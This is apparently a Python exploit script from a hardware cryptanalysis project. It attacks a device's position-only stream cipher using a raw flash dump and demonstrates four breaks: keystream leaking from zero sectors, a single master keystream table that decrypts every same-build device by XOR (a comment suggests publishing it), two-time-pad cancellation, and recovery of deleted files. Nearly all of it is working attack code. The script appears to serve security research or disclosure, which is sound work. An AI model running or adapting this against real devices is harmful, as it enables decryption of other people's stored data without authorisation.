#!/usr/bin/env python3
"""
attack3 -- four short, concrete consequences of a positional stream cipher with
firmware-fixed, position-only keystream. Each runs against the same cold dump
used by recover_keystream.py, or against a self-contained synthetic volume.

  N1  in-band keystream oracle -- zero-plaintext regions inside the volume hand
      the keystream to anyone with the raw dump (ciphertext == keystream there)
  N3  master keystream table   -- one precomputed table is the whole product
      line's key; decryption becomes a firmware-free, code-free XOR
  N4  two-time pad              -- two volumes encrypted at the same positions
      cancel the keystream: C1 ^ C2 == P1 ^ P2, recoverable with a crib
  N5  no secure erase          -- a "deleted" FAT file is still fully decryptable
      from the raw flash; deletion flips one directory byte, not the data

Usage:
    python3 extra_attacks.py <flash_dump.bin>
"""
import io
import os
import sys
import zipfile

import numpy as np

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import recover_keystream as R  # noqa: E402  (local module, resolved from this dir)

SEC = R.SEC


def _load_storage(path):
    dump = open(path, "rb").read()
    return dump[R.STORAGE_OFF:R.STORAGE_OFF + R.STORAGE_LEN]


def n1_inband_oracle(ct, gen):
    """A cold dump leaks keystream wherever the plaintext is a known constant.
    The reserved/free sectors are zero, so their ciphertext IS the keystream."""
    A, seed, B, W = gen
    args = R.position_args(len(ct) // SEC, A, B, W)
    pt = R.decrypt_np(np.frombuffer(ct, dtype=np.uint8), args, seed)
    ks = R.keystream_from_args(args, seed)
    ct_arr = np.frombuffer(ct, dtype=np.uint8)
    zero_mask = np.zeros(len(ct), dtype=bool)
    nsec = len(ct) // SEC
    for L in range(nsec):
        if not pt[L * SEC:(L + 1) * SEC].any():
            zero_mask[L * SEC:(L + 1) * SEC] = True
    leaked_ok = bool(np.all(ct_arr[zero_mask] == ks[zero_mask]))
    print(f"  N1: {int(zero_mask.sum())} bytes of keystream leak in-band "
          f"(ciphertext == keystream on zero sectors): match={leaked_ok}")
    print(f"      -> these positions alone bootstrap the recovery, no device/slack needed")
    return leaked_ok


def n3_master_table(ct, gen):
    """The keystream depends only on position and firmware-global constants, so
    one table decrypts every device of the line by pure XOR, no code, no key."""
    A, seed, B, W = gen
    args = R.position_args(len(ct) // SEC, A, B, W)
    table = R.keystream_from_args(args, seed)                 # the shareable "key"
    plain_ref = R.decrypt_all(ct, A, seed, B, W)
    plain_xor = (np.frombuffer(ct, dtype=np.uint8) ^ table).tobytes()
    ok = plain_xor == plain_ref
    print(f"  N3: master table = {len(table)} bytes ({len(table)//1024} KiB); "
          f"pure-XOR decryption matches full recovery: {ok}")
    print(f"      -> publish the table once; every same-build safe opens with `xor`")
    return ok


def n4_two_time_pad(gen):
    """Two volumes encrypted at the same positions share the keystream, so it
    cancels: C1 ^ C2 == P1 ^ P2. With one side known (a crib) the other falls."""
    A, seed, B, W = gen
    args = R.position_args(2, A, B, W)[:SEC]
    ks = R.keystream_from_args(args, seed)[:SEC]
    p1 = bytes(range(256)) * 2
    p2 = b"CONFIDENTIAL: launch code 0000-1111".ljust(SEC, b"\x00")
    c1 = bytes(a ^ b for a, b in zip(p1, ks))
    c2 = bytes(a ^ b for a, b in zip(p2, ks))
    xor_of_ct = bytes(a ^ b for a, b in zip(c1, c2))
    xor_of_pt = bytes(a ^ b for a, b in zip(p1, p2))
    cancels = xor_of_ct == xor_of_pt
    p2_rec = bytes(a ^ b for a, b in zip(xor_of_ct, p1))
    print(f"  N4: C1^C2 == P1^P2 (keystream cancels): {cancels}; "
          f"crib recovers other side: {p2_rec[:35] == p2[:35]}")
    return cancels and p2_rec == p2


def n5_no_secure_erase(gen):
    """A FAT delete only marks the directory entry (0xE5); the clusters keep the
    data. On raw flash + positional keystream the 'deleted' file decrypts fully."""
    A, seed, B, W = gen
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr("passwords.txt", b"root:hunter2\nadmin:letmein\n")
    secret = zbuf.getvalue()

    nsec = 32
    vol = bytearray(nsec * SEC)
    vol[10 * SEC:10 * SEC + len(secret)] = secret
    dir_entry = bytearray(b"PASSWRD TXT")
    vol[6 * SEC:6 * SEC + len(dir_entry)] = dir_entry
    args = R.position_args(nsec, A, B, W)
    ct = (np.frombuffer(bytes(vol), dtype=np.uint8) ^ R.keystream_from_args(args, seed)).tobytes()

    vol[6 * SEC] = 0xE5
    ct = bytearray(ct)
    ct[6 * SEC] = vol[6 * SEC] ^ int(R.keystream_from_args(args, seed)[6 * SEC])

    recovered = R.decrypt_all(bytes(ct), A, seed, B, W)
    got = recovered[10 * SEC:10 * SEC + len(secret)]
    ok = got == secret and b"hunter2" in zipfile.ZipFile(io.BytesIO(got)).read("passwords.txt")
    print(f"  N5: deleted file fully recovered from raw flash: {ok} "
          f"(dir entry marked 0xE5, {len(secret)} data bytes intact)")
    return ok


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 2
    ct = _load_storage(argv[1])
    gen = R.recover(ct)
    if gen is None:
        print("[FAIL] could not recover generator from dump")
        return 1
    print(f"[*] generator recovered (B=0x{gen[2]:08X} W=0x{gen[3]:08X} A=0x{gen[0]:08X})")
    results = [
        n1_inband_oracle(ct, gen),
        n3_master_table(ct, gen),
        n4_two_time_pad(gen),
        n5_no_secure_erase(gen),
    ]
    ok = all(results)
    print(f"\n[{'PASS' if ok else 'FAIL'}] {sum(results)}/{len(results)} extra vectors demonstrated")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
